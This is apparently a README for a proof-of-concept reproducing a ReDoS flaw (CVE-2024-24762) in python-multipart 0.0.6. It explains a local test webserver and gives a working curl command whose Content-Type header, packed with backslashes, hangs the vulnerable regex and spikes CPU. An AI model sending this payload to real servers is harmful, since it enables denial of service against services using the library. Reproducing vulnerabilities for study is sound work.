# Proof of Concept

## Brief explanation

We credit the creators of this Proof of Concept, whose work we utilized to
understand the ReDoS and simulate its behaviour with our engine -
[blogpost by 'Smartkeyss'](https://www.vicarius.io/vsociety/posts/redos-in-python-multipart-cve-2024-24762).

The main.py file contains a simple webserver that listens to requests incoming
on port 8123, obtains the header 'Content-Type' and asks python-multipart to
process it. As we know, this endpoint will try to parse the header info
using a flawed regex expression, meaning one can easily exploit it.

## How to trigger the exploit

All commands must be run in the current directory `PoC/`

1. Install the vulnerable multipart version: `pip install python-multipart==0.0.6`
2. Start the webserver `./main.py`
3. On a new terminal, execute the following command:

```
curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'
```

4. Observe the results. Either by checking how long it takes to finish or
use `htop` on a new terminal to see the CPU usage, which will increase
a lot
